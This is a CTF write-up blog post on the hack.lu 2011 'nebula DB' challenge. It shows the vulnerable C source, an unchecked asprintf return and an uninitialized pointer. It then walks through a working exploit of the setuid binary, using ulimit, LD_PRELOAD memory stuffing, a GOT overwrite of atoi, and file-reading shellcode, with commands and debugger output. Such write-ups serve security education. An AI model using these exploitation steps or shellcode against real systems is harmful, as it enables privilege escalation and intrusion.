---
title: hack.lu CTF 2011 nebula DB systems
author: suto
layout: post

aktt_notify_twitter:
  - no
shorturls:
  - 'a:4:{s:5:"bitly";s:0:"";s:9:"permalink";s:69:"http://www.vnsecurity.net/2011/09/hack-lu-ctf-2011-nebula-db-systems/";s:7:"tinyurl";s:26:"http://tinyurl.com/3faask5";s:4:"isgd";s:19:"http://is.gd/xwVBVj";}'
tweetbackscheck:
  - 1408358970
twittercomments:
  - 'a:0:{}'
tweetcount:
  - 0
category:
  - 'CTF - CLGT Crew'
tags:
  - '2011'
  - asprintf
  - CLGT
  - CTF
  - Hack.lu
  - uninitialized memory
---
Challenge Summary:

> While you were investigating the Webserver of Nebula Death Stick Services, we, the Galactic&#8217;s Secret Service, put our hands on a SSH account of one of the Nebula Death Stick Services founders. This account directly leads to one of their Death Stick storage clusters. Therefore we instruct you with another mission: this time you will have to break their database systems in order to get higher privileges and find further infos about Nebula Corp. And again, may the force be with you!  
> User: nebulauser
> 
> Pass: nebulauser
> 
> Host: ctf.hack.lu
> 
> Port: 2008

After login to ctf.hack.lu server we get 4 files:  
-nebula_db  
-nebula\_db\_nosuid  
\_nebula\_db.c  
_hint

nebula\_db is a file with suid(s) bits, when you execute that you have required permission to read the flag, nebula\_db\_nosuid is the file for testing and debuging purpose, nebula\_db.c is source code of challenge, hint is tell you where is the flag stored.  
So basically you need to execute nebula_db and some how try to alter execution flow to do some more thing for you ( read the flag ).  
First things is try to spot the vuln by reading source code they provided:

<pre class="brush: cpp; title: ; notranslate" title="">/* Nebula Death Stick Services Database Management System
 * This Software has been written to keep track of our customers and their orders.
 * It is still in developement, but I'm pretty sure it's already stable enough for a safe maintenance.
 */

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

#define DB_SIZE 256

char *db[DB_SIZE];

int edit_entry(char *choice, unsigned int entry)
{
        char edit[256], *ln;
        unsigned int len;

        if (atoi(choice) &gt; entry - 1 || atoi(choice) &lt; 0 || entry == 0)
                return -1;

        len = strlen(db[atoi(choice)]);

        printf("Enter your edit: ");
        fgets(edit, sizeof(edit) - 1, stdin);

        ln = strchr(edit, 'n');

        if (ln != NULL)
                *ln = '&#092;&#048;';

        strncpy(db[atoi(choice)], edit, len);

        return 0;
}

char *insert_new_order(unsigned int entry, char *name, char *amount)
{
        char sname[256], samount[256], *nl, *ptr;(3)
        int ret;

        nl = strchr(name, 'n');

        if (nl != NULL)
                *nl = '&#092;&#048;';

        nl = strchr(amount, 'n');

        if (nl != NULL)
                *nl = '&#092;&#048;';

        ret = asprintf(&ptr, "ID: %d: Name: %s Amount: %s", entry, name, amount);

        if (ret == 0)
                return NULL;

        return ptr;
}

char *enter_new_order(unsigned int entry)
{
        char name[256], amount[256];

        printf("Enter a Name: ");
        fgets(name, sizeof(name) - 1, stdin);

        printf("Enter amount of Death Sticks: ");
        fgets(amount, sizeof(amount) - 1, stdin);

        if (atoi(amount) &lt;= 0) {
                fprintf(stderr, "Insert a real amount please!n");
                return NULL;
        }

        if (entry &gt; DB_SIZE - 1) {
                fprintf(stderr, "Database already full!n");
                return NULL;
        }

        return insert_new_order(entry, name, amount);

}

int print_database(unsigned int entry)
{
        unsigned int i;

        for (i = 0; i &lt; entry; i++)
                printf("%sn", db[i]);

        return 0;
}

int exit_free(unsigned int entry)
{
        unsigned int i;

        for (i = 0; i &lt; entry; i++)
                free(db[i]);

        return 0;
}

int main(int argc, char **argv)
{
        char choice[256], *ret;
        unsigned int entry = 0, len, i;

        puts(
                "Nebula Database set up!n"
                "Enter your choice of action:n"
                "1 - Insert new ordern"
                "2 - Edit ordern"
                "3 - List ordersn"
                "4 - Exitn"
        );

        while (1) {(4)
                printf("Your choice: ");
                fgets(choice, sizeof(choice) - 1, stdin);
                switch (atoi(choice)) {
                        case 1:
                        ret = enter_new_order(entry);

                        if (ret == NULL) {
                                fprintf(stderr, "Error inserting new order!n");
                                break;
                        }

                        db[entry] = ret;
                        entry++;(2)
                        break;

                        case 2:
                        printf("Enter the ID of your order: ");
                        fgets(choice, sizeof(choice) - 1, stdin);

                        if (edit_entry(choice, entry) == -1)
                                fprintf(stderr, "That entry does not exist!n");

                        break;

                        case 3:
                        print_database(entry);
                        break;

                        case 4:
                        return exit_free(entry);

                        default:
                        fprintf(stderr, "Option does not existn");
                }
        }

        return 0;
}

</pre>

As they said, the challenge is a small db management, it save name and amount of orders in an array up to 256 record. You can add or edit a record.  
So the funny part is:

<pre class="brush: cpp; title: ; notranslate" title="">ret = asprintf(&ptr, "ID: %d: Name: %s Amount: %s", entry, name, amount);
   if (ret == 0)
                return NULL;
</pre>

And after reading manpages of asprintf, i figured out there is a problem when using it without fully understand what it returned, so return value indicate how many bytes it printed, and the funny part is when it failed, it will return -1 but programmer is not check for that case, they think when it will return 0 mean it failed.  
It mean we can still increase entry value at (2) without create any new record. It basic will lead to double free memory corruption error. So next thing is try to figure out how to force asprintf return -1 ( or force it can&#8217;t alloc any memory ). After getting help from rd and xichzo, we found ulimit do the tricks:

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Your choice: 1
Enter a Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter amount of Death Sticks: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Your choice: 4
*** glibc detected *** ./n: double free or corruption (out): 0x08049118 ***
Aborted (core dumped)
suto@ubuntu:~$
</pre>

After getting here, i see another way can lead to successful exploitation. When asprintf fail, it will use ptr(3) at a result for main program use to keep track a record, somehow we can make this ptr point to some where we want and edit_entry will take care the rest to write a value we control to that address(since ptr is use without initialized)  
But i can&#8217;t find anyway to do that, so i thinking another solution.  
And i wonder if when the first alloc failt, so it will use the original value of at that address. After some check i&#8217;m stuck cause i can&#8217;t not do anything without this default value.  
I try some google in hopeless :p with keyword: &#8220;control uninitialized memory&#8221;  
At the first resutls is:  
[http://drosenbe.blogspot.com/2010/04/controlling-uninitialized-memory-with.html  
][1]  
Another trick to control memory at the begining of process execution. Let&#8217;s check:

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$ export LD_PRELOAD=`python -c 'print "A"*20000'`
suto@ubuntu:~$ ulimit -c unlimited
suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db
ERROR: ld.so: object '&lt;A&gt;*20000...
 from LD_PRELOAD cannot be preloaded: ignored.
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Your choice: 1
Enter a Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter amount of Death Sticks: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Your choice: 2
Enter the ID of your order: 0
Segmentation fault (core dumped)
suto@ubuntu:~$
</pre>

So if this tricks work, we will have a write to address at 0&#215;41414141.

<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/i $eip
=&gt; 0xb764b706:  movdqu (%edi),%xmm1
(gdb) i r $edi
edi            0x41414141       1094795585
(gdb) bt
#0  0xb764b706 in ?? () from /lib/i386-linux-gnu/libc.so.6
#1  0x0804864c in edit_entry ()
#2  0x08048a04 in main ()
</pre>

So this is all i want :p Next things is find some where to write, and i choose GOT section, first thing i trying is printf@GOT and using a hardcode address to return, and i stupid try to do that to the end of the game :(.  
After that, thinking a little bit, i got another solution:  
After the calling edit_entry ( where we can directly write to GOT section), program will return to while loop at (4) and continue execute, then i see a good candidate to overwrite is atoi, why? cause after fgets at (5) eax will point to our string, and we will use call *eax gadget to execute our shellcode.  
And finally:

<pre class="brush: bash; title: ; notranslate" title="">export LD_PRELOAD=`python -c 'print "x18x91x04x08"*4000+"xcc"*1000'`
</pre>

This will force program wirte to atoi@PLT and

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$ objdump -d n | grep call | grep eax
 80485a8:       ff 14 85 08 90 04 08    call   *0x8049008(,%eax,4)
 80485ef:       ff d0                   call   *%eax
 8048b1b:       ff d0                   call   *%eax
suto@ubuntu:~$ python -c 'print "1n"+"A"*250+"n"+"1"*250+"n"+"2n0n"+"x1bx8bx04x08"*40+"xcc"*400' &gt; input
suto@ubuntu:~$ bash
suto@ubuntu:~$ ulimit -s unlimited
suto@ubuntu:~$ export LD_PRELOAD=`python -c 'print "x18x91x04x08"*4000+"xcc"*1000'`
suto@ubuntu:~$ ulimit -c unlimited
suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db &lt; input
ERROR: ld.so: object from LD_PRELOAD cannot be preloaded: ignored.
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Trace/breakpoint trap (core dumped)
.......
(gdb) x/20x $eip
0xbfa33571:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa33581:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa33591:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa335a1:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa335b1:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
</pre>

So you can replace xcc with a shellcode to read the flag key file.  
Here is my shellcode to read /home/suto/flag and write to /tmp/flag: ( [assembly source][2])

<pre class="brush: cpp; title: ; notranslate" title="">char shellcode[] =
        "xebx44x5bx31xc0x88x43x0fxb0x05xb9x42x44x41x41"
        "xc1xe1x14xc1xe9x14x66xbaxe4x01xcdx80x50x83xc3"
        "x10x31xc0xb0x05xcdx80x5bx50xb0xc8x29xc4x89xe1"
        "x89xc2x31xc0xb0x03xcdx80xb0xc8x01xc4x5bx31xc0"
        "xb0x04xcdx80x31xc0xb0x01xcdx80xe8xb7xffxffxff"
        "x2fx68x6fx6dx65x2fx73x75x74x6fx2fx66x6cx61x67"
        "x41x2fx74x6dx70x2fx66x6cx61x67";

</pre>

<pre class="brush: cpp; title: ; notranslate" title="">suto@ubuntu:~$ python -c 'print "1n"+"A"*250+"n"+"1"*250+"n"+"2n0n"+  "xebx44x5bx31xc0x88x43x0fxb0x05xb9x42x44x41x41       xc1xe1x14xc1xe9x14x66xbaxe4x01xcdx80x50x83xc3
x10x31xc0xb0x05xcdx80x5bx50xb0xc8x29xc4x89xe1
x89xc2x31xc0xb0x03xcdx80xb0xc8x01xc4x5bx31xc0
xb0x04xcdx80x31xc0xb0x01xcdx80xe8xb7xffxffxff
x2fx68x6fx6dx65x2fx73x75x74x6fx2fx66x6cx61x67
x41x2fx74x6dx70x2fx66x6cx61x67";' &gt; input
suto@ubuntu:~$./nebula_db &lt; input
suto@ubuntu:~$cat /tmp/flag
hello
</pre>

Finally,congratz to bobsleigh is the only team solved it.  
Thanks fluzfinger team for a great ctf. See u guys in next year!

&#8211;suto&#8211;

 [1]: http://drosenbe.blogspot.com/2010/04/controlling-uninitialized-memory-with.html
 [2]: http://pastebin.com/yWUE40cM